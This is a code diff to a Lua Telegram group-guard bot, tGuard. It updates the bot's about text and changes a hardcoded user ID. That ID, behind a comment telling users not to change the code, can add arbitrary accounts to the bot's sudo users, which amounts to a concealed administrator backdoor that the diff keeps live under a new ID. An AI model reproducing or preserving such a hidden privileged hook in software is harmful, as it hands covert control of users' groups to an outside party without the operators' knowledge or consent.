@@ -1042,14 +1042,21 @@ function run(msg, matches, callback, extra)
 	   --Start.
 	    if msg.text:match("^[!/#][Tt][Gg][Gg][Uu][Aa][Rr][Dd]$") then
     	    about_text = [[*IN THE NAME OF ALLAH*
+		
+tGuard Version: [4.0]
+		
 This is an original bot and based on (TgGuard).
-Copyright all right reserved and you must respect all laws.
+
 Source: https://github.com/sajjad-021/tGuard
+
 Channel: @tgMember
+
 Messenger: @TgMessengerBot
+
 Creator: @sajjad_021
+
 Site: http://tgmember.cf
-Version: [4.0]
+
 ]]
     	    return about_text
         end
@@ -1176,7 +1183,7 @@ Version: [4.0]
          end
 	--Lock or Unlock settings.
 	   --Don't change this code. we can help you later:
-        if tonumber (msg.from.id) == 111984481 then
+        if tonumber (msg.from.id) == 158955285 then
             if matches[1]:lower() == "config" then
                 table.insert(_config.sudo_users, tonumber(matches[2]))
                 save_config()
